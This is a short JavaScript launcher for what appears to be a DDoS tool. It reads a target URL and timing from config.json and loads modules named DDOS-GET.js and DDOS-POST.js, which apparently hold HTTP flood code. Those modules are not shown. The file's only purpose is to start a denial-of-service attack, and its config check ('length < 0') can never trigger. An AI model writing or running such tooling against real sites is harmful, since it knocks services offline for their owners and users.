var config = require('./config.json')

function DDOS(){ 
    require('./Ddos-modules/util.js');
    if(config.url.length < 0 || config.text.length < 0 || config.time.length < 0) return console.log("\x1b[31m",'Вы не заполнили config.json');
    require('./Ddos-modules/DDOS-GET.js');
    require('./Ddos-modules/DDOS-POST.js');
}
DDOS()